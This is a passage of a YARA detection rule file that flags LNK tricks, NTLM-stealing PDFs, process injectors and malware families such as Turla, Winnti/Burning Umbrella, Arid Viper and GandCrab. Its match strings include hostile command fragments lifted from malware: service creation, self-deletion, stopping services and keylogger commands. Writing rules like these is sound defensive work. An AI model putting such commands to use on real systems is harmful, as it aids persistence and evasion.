} 

rule SUSP_LNK_File_PathTraversal_RID311F : DEMO FILE SUSP T1023 T1136 T1210 {
   meta:
      description = "Detects a suspicious link file that references a file multiple folders lower than the link itself"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/05/deep-dive-into-rig-exploit-kit-delivering-grobios-trojan.html"
      date = "2018-05-16 13:09:01"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1023, T1136, T1210"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "..\\..\\..\\..\\..\\" 
   condition: 
      uint16 ( 0 ) == 0x004c and uint32 ( 4 ) == 0x00021401 and ( filesize < 1KB and all of them )
} 

rule SUSP_LNK_Big_Link_File_RID2EDD : DEMO FILE SUSP T1023 T1210 {
   meta:
      description = "Detects a suspiciously big LNK file - maybe with embedded content"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-15 11:32:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1023, T1210"
      minimum_yara = "1.7"
      
   condition: 
      uint16 ( 0 ) == 0x004c and uint32 ( 4 ) == 0x00021401 and filesize > 200KB
} 

rule MAL_Floxif_Generic_RID2DCE : DEMO EXE FILE GEN MAL {
   meta:
      description = "Detects Floxif Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-11 10:47:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == "2f4ddcfebbcad3bacadc879747151f6f" or pe.exports ( "FloodFix" ) or pe.exports ( "FloodFix2" ) )
} 

rule MAL_CN_FlyStudio_May18_1_RID2F5C : CHINA DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware / hacktool detected in May 2018"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-11 11:53:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "WTNE / MADE BY E COMPILER - WUTAO " fullword ascii
      $s2 = "www.cfyhack.cn" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == "65ae5cf17140aeaf91e3e9911da0ee3e" or 1 of them )
} 

rule SUSP_Microsoft_Copyright_String_Anomaly_2_RID3720 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects Floxif Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-11 17:25:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Microsoft(C) Windows(C) Operating System" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them
} 

rule MAL_BurningUmbrella_Sample_7_RID31AA : APT DEMO EXE FILE {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and pe.imphash ( ) == "f5b113d6708a3927b5cc48f2215fcaff"
} 

rule MAL_BurningUmbrella_Sample_8_RID31AB : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:32:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd /c open %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them
} 

rule MAL_BurningUmbrella_Sample_10_RID31D4 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "revjj.syshell.org" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule MAL_BurningUmbrella_Sample_11_RID31D5 : APT DEMO FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Resume.app/Contents/Java/Resume.jarPK" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them
} 

rule MAL_BurningUmbrella_Sample_13_RID31D7 : APT DEMO EXE FILE {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == "75f201aa8b18e1c4f826b2fe0963b84f"
} 

rule MAL_BurningUmbrella_Sample_14_RID31D8 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\tmp\\Google_updata.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 1 of them
} 

rule MAL_BurningUmbrella_Sample_15_RID31D9 : APT DEMO EXE FILE {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:40:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and pe.imphash ( ) == "cc33b1500354cf785409a3b428f7cd2a"
} 

rule MAL_BurningUmbrella_Sample_16_RID31DA : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:40:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://netimo.net 0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them
} 

rule MAL_BurningUmbrella_Sample_1_RID31A4 : APT DEMO EXE FILE {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:31:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = { 40 00 00 E0 75 68 66 61 6F 68 6C 79 } 
      $s2 = { 40 00 00 E0 64 6A 7A 66 63 6D 77 62 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and ( pe.imphash ( ) == "baa93d47220682c04d92f7797d9224ce" and $s1 in ( 0 .. 1024 ) and $s2 in ( 0 .. 1024 ) )
} 

rule MAL_BurningUmbrella_Sample_2_RID31A5 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = { 40 00 00 E0 63 68 72 6F 6D 67 75 78 } 
      $s2 = { 40 00 00 E0 77 62 68 75 74 66 6F 61 } 
      $s3 = "ActiveX Manager" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and $s1 in ( 0 .. 1024 ) and $s2 in ( 0 .. 1024 ) and $s3
} 

rule MAL_BurningUmbrella_Sample_3_RID31A6 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:31:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "HKEY_CLASSES_ROOT\\Word.Document.8\\shell\\Open\\command" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them
} 

rule MAL_BurningUmbrella_Sample_4_RID31A7 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $x1 = "dumpodbc.exe" fullword ascii
      $x2 = "photo_Bundle.exe" fullword ascii
      $x3 = "Connect 2 fails : %d,%s:%d" fullword ascii
      $x4 = "Connect fails 1 : %d %s:%d" fullword ascii
      $x5 = "New IP : %s,New Port: %d" fullword ascii
      $x6 = "Micrsoft Corporation. All rights reserved." fullword wide
      $x7 = "New ConFails : %d" fullword ascii
      $s1 = "cmd /c net stop stisvc" fullword ascii
      $s2 = "cmd /c net stop spooler" fullword ascii
      $s3 = "\\temp\\s%d.dat" fullword ascii
      $s4 = "cmd /c net stop wuauserv" fullword ascii
      $s5 = "User-Agent: MyApp/0.1" fullword ascii
      $s6 = "%s->%s Fails : %d" fullword ascii
      $s7 = "Enter WorkThread,Current sock:%d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( ( pe.exports ( "Print32" ) and 2 of them ) or 1 of ( $x* ) or 4 of them )
} 

rule MAL_BurningUmbrella_Sample_6_RID31A9 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ExecuteFile=\"hidcon:nowait:\\\"Word\\\\r.bat\\\"\"" fullword ascii
      $s2 = "InstallPath=\"%Appdata%\\\\Microsoft\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
} 

rule MAL_BurningUmbrella_Sample_12_RID31D6 : APT DEMO EXE FILE T1050 T1085 T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1050, T1085, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "%SystemRoot%\\System32\\qmgr.dll" fullword ascii
      $s2 = "rundll32.exe %s,Startup" fullword ascii
      $s3 = "nvsvcs.dll" fullword wide
      $s4 = "SYSTEM\\CurrentControlSet\\services\\BITS\\Parameters" fullword ascii
      $s5 = "http://www.sginternet.net 0" fullword ascii
      $s6 = "Microsoft Corporation. All rights reserved." fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( pe.exports ( "SvcServiceMain" ) and 5 of them )
} 

rule MAL_BurningUmbrella_Sample_17_RID31DB : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:40:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "syshell" fullword wide
      $s2 = "Normal.dotm" fullword ascii
      $s3 = "Microsoft Office Word" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
} 

rule MAL_BurningUmbrella_Sample_18_RID31DC : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:40:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "c:\\tmp\\tran.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == "11675b4db0e7df7b29b1c1ef6f88e2e1" or pe.imphash ( ) == "364e1f68e2d412db34715709c68ba467" or pe.exports ( "deKernel" ) or 1 of them )
} 

rule MAL_BurningUmbrella_Sample_19_RID31DD : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:40:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Cryption.dll" fullword ascii
      $s2 = "tran.exe" fullword ascii
      $s3 = "Kernel.dll" fullword ascii
      $s4 = "Now ready to get the file %s!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them
} 

rule MAL_BurningUmbrella_Sample_20_RID31D5 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "Wordpad.Document.1\\shell\\open\\command\\" fullword wide
      $s2 = "%s\\shell\\Open\\command" fullword wide
      $s3 = "expanding computer" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == "bac338bfe2685483c201e15eae4352d5" or 2 of them )
} 

rule MAL_BurningUmbrella_Sample_21_RID31D6 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "c:\\windows\\ime\\setup.exe" fullword ascii
      $s2 = "ws.run \"later.bat /start\",0Cet " fullword ascii
      $s3 = "del later.bat" fullword ascii
      $s4 = "mycrs.xls" fullword ascii
      $a1 = "-el -s2 \"-d%s\" \"-p%s\" \"-sp%s\"" fullword ascii
      $a2 = "<set ws=wscript.createobject(\"wscript.shell\")" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 2 of them
} 

rule MAL_BurningUmbrella_Sample_22_RID31D7 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" fullword ascii
      $s3 = "Content-Disposition: form-data; name=\"txt\"; filename=\"" fullword ascii
      $s4 = "Fail To Enum Service" fullword ascii
      $s5 = "Host Power ON Time" fullword ascii
      $s6 = "%d Hours %2d Minutes %2d Seconds " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them
} 

rule MAL_AirdViper_Sample_Apr18_1_RID310C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Arid Viper malware sample"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-04 13:05:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"" fullword ascii
      $x2 = "daenerys=%s&" ascii
      $x3 = "betriebssystem=%s&anwendung=%s&AV=%s" ascii
      $s1 = "Taskkill /IM  %s /F &  %s" fullword ascii
      $s2 = "/api/primewire/%s/requests/macKenzie/delete" fullword ascii
      $s3 = "\\TaskWindows.exe" ascii
      $s4 = "MicrosoftOneDrives.exe" fullword ascii
      $s5 = "\\SeanSansom.txt" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and ( 1 of ( $x* ) or 4 of them )
} 

rule MAL_Winnti_Sample_May18_1_RID3003 : APT CHINA DEMO EXE FILE G0044 T1136 {
   meta:
      description = "Detects malware sample from Burning Umbrella report - Generic Winnti Rule"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 12:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, G0044, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wireshark" fullword wide
      $s2 = "procexp" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule MAL_Visel_Sample_May18_1_RID2F8D : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Visel malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 12:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s2 = "print32.dll" fullword ascii
      $s3 = "c:\\a\\b.txt" fullword ascii
      $s4 = "\\temp\\s%d.dat" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.exports ( "szFile" ) or 2 of them )
} 

rule MAL_Turla_Sample_May18_1_RID2F92 : DEMO EXE FILE G0010 MAL RUSSIA T1136 {
   meta:
      description = "Detects Turla samples"
      author = "Florian Roth"
      reference = "https://twitter.com/omri9741/status/991942007701598208"
      date = "2018-05-03 12:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0010, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "sc %s create %s binPath= \"cmd.exe /c start %%SystemRoot%%\\%s\">>%s" fullword ascii
      $x2 = "cmd.exe /c start %%SystemRoot%%\\%s" fullword ascii
      $x3 = "cmd.exe /c %s\\%s -s %s:%s:%s -c \"%s %s /wait 1\">>%s" fullword ascii
      $x4 = "Read InjectLog[%dB]********************************" fullword ascii
      $x5 = "%s\\System32\\011fe-3420f-ff0ea-ff0ea.tmp" fullword ascii
      $x6 = "**************************** Begin ini %s [%d]***********************************************" fullword ascii
      $x7 = "%s -o %s -i %s -d exec2 -f %s" fullword ascii
      $x8 = "Logon to %s failed: code %d(User:%s,Pass:%s)" fullword ascii
      $x9 = "system32\\dxsnd32x.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them
} 

rule SUSP_Bad_PDF_RID2AFB : DEMO FILE SUSP T1136 {
   meta:
      description = "Detects PDF that embeds code to steal NTLM hashes"
      author = "Florian Roth, Markus Neis"
      reference = "Internal Research"
      date = "2018-05-03 08:47:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "         /F (http//" ascii
      $s2 = "        /F (\\\\\\\\" ascii
      $s3 = "<</F (\\\\" ascii
   condition: 
      ( uint32 ( 0 ) == 0x46445025 or uint32 ( 0 ) == 0x4450250a ) and 1 of them
} 

rule MAL_Hogfish_Report_Related_Sample_RID33CE : APT DEMO EXE FILE G0045 T1136 {
   meta:
      description = "Detects APT10 / Hogfish related samples"
      author = "Florian Roth"
      reference = "https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf"
      date = "2018-05-01 15:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0045, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "R=user32.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == "efad9ff8c0d2a6419bf1dd970bcd806d" or 1 of them )
} 

rule MAL_RedLeaves_Apr18_1_RID2E40 : APT DEMO EXE FILE {
   meta:
      description = "Detects RedLeaves malware"
      author = "Florian Roth"
      reference = "https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf"
      date = "2018-05-01 11:06:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == "7a861cd9c495e1d950a43cb708a22985" or pe.imphash ( ) == "566a7a4ef613a797389b570f8b4f79df" )
} 

rule MAL_Sednit_DelphiDownloader_Apr18_3_RID33F2 : DEMO EXE FILE G0007 MAL T1136 {
   meta:
      description = "Detects malware from Sednit Delphi Downloader report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/"
      date = "2018-04-24 15:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0007, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "Processor Level: " fullword ascii
      $ = "CONNECTION ERROR" fullword ascii
      $ = "FILE_EXECUTE_AND_KILL_MYSELF" ascii
      $ = "-KILL_PROCESS-" fullword ascii
      $ = "-FILE_EXECUTE-" fullword ascii
      $ = "-DOWNLOAD_ERROR-" fullword ascii
      $ = "CMD_EXECUTE" fullword ascii
      $ = "\\Interface\\Office\\{31E12FE8-937F-1E32-871D-B1C9AOEF4D4}\\" fullword ascii
      $ = "Mozilla/3.0 (compatible; Indy Library)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 3 of them
} 

rule MAL_GandCrab_Apr18_1_RID2DB7 : DEMO EXE FILE MAL {
   meta:
      description = "Detects GandCrab malware"
      author = "Florian Roth"
      reference = "https://twitter.com/MarceloRivero/status/988455516094550017"
      date = "2018-04-23 10:43:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and pe.imphash ( ) == "7936b0e9491fd747bf2675a7ec8af8ba"
} 

rule ProcessInjector_Gen_RID2EA7 : DEMO EXE FILE GEN HKTL T1136 {
   meta:
      description = "Detects a process injection utility that can be used ofr good and bad purposes"
      author = "Florian Roth"
      reference = "https://github.com/cuckoosandbox/monitor/blob/master/bin/inject.c"
      date = "2018-04-23 11:23:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, HKTL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "Error injecting remote thread in process:" fullword ascii
      $s5 = "[-] Error getting access to process: %ld!" fullword ascii
      $s6 = "--process-name <name>  Process name to inject" fullword ascii
      $s12 = "No injection target has been provided!" fullword ascii
      $s17 = "[-] An app path is required when not injecting!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( pe.imphash ( ) == "d27e0fa013d7ae41be12aaf221e41f9b" or 1 of them ) or 3 of them
} 

rule MAL_WebMonitor_RAT_RID2D96 : DEMO EXE FILE MAL T1047 T1057 T1136 {
   meta:
      description = "Detects WebMonitor RAT"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/04/unit42-say-cheese-webmonitor-rat-comes-c2-service-c2aas/"
      date = "2018-04-13 10:38:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1047, T1057, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "send_keylog_stream_start" fullword wide
      $x2 = "KEYLOG_STREAM_STOP" fullword wide
      $s1 = "SHELL_EXEC" fullword wide
      $s2 = "send_shell_exec" fullword wide
      $s3 = "send_connections_get" fullword wide
      $a1 = "Select * from Win32_PerfRawData_PerfProc_Process where IDProcess = '" fullword wide
      $a2 = "Select * from Win32_Process WHERE handle =" fullword wide
      $a3 = "Select * from Win32_Process where ProcessId=" fullword wide
      $a4 = "Select * from Win32_ComputerSystem" fullword wide
      $a5 = "The service is in the process of being continued" fullword wide
      $a6 = "tcpdump" fullword wide
      $a7 = "memdump" fullword wide
      $a8 = "<val1>Processor</val1>" fullword wide
      $a9 = "Win32 share process" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or ( 2 of ( $s* ) and 2 of ( $a* ) ) or 7 of them )
} 

rule WINNTI_KingSoft_Moz_Confustion_RID328A : DEMO EXE FILE G0044 MAL {
   meta:
      description = "Detects Barium sample with Copyright confusion"
      author = "Markus Neis"
      reference = "https://www.virustotal.com/en/file/070ee4a40852b26ec0cfd79e32176287a6b9d2b15e377281d8414550a83f6496/analysis/"
      date = "2018-04-13 14:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0044, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == "7f01b23ccfd1017249c36bc1618d6892" or ( pe.version_info [ "LegalCopyright" ] contains "Mozilla Corporation" and pe.version_info [ "ProductName" ] contains "Kingsoft" ) )
} 

rule MAL_Turla_Agent_BTZ_RID2DEF : DEMO EXE FILE G0010 MAL RUSSIA T1136 {
   meta:
      description = "Detects Turla Agent.BTZ"
      author = "Florian Roth"
      reference = "https://www.gdatasoftware.com/blog/2014/11/23937-the-uroburos-case-new-sophisticated-rat-identified"
      date = "2018-04-12 10:53:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0010, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
